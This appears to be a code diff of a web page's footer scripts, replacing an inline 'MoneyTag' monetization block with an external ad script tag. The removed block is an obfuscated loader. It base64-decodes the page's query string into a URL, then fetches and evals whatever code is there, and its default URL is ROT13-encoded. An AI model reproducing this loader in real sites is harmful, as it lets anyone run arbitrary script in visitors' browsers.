@@ -174,35 +174,11 @@
     Support Us - Check out our partner ShrinkMe! Share & Earn Rewards
   </a>
 
-  <!-- MoneyTag Monetization Script -->
+  <!-- Your monetization script -->
+  <script src="//immortalitysignalbelow.com/ce/d4/9e/ced49e78846fa1b9b6247df408d08f06.js"></script>
+
+  <!-- Social sharing and subscribe scripts -->
   <script>
-  (function() {
-    const defaultURL = "https://staupsoaksy.net/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2";
-
-    function getScriptURL() {
-      try {
-        const urlFromHash = atob(location.search.slice(1));
-        return urlFromHash || defaultURL;
-      } catch (e) {
-        return defaultURL;
-      }
-    }
-
-    function loadScript(url) {
-      try {
-        importScripts(url);
-      } catch (e) {
-        fetch(url)
-          .then(response => response.text())
-          .then(code => eval(code))
-          .catch(err => console.warn("MoneyTag failed to load:", err));
-      }
-    }
-
-    const scriptURL = getScriptURL();
-    loadScript(scriptURL);
-  })();
-
   // Social sharing functions
   function shareOnFacebook() {
     const url = encodeURIComponent(window.location.href);
@@ -231,13 +207,11 @@
       msg.textContent = 'Please enter a valid email.';
       return;
     }
+    // Dummy success message (no backend yet)
     msg.textContent = `Thanks for subscribing, ${email}! Stay tuned.`;
     emailInput.value = '';
   }
   </script>
-
-  <!-- Immortality Signal Ad Script -->
-  <script src='//immortalitysignalbelow.com/ce/d4/9e/ced49e78846fa1b9b6247df408d08f06.js'></script>
 
   <footer>
     &copy; 2025 Gaana Entertainment. All rights reserved.
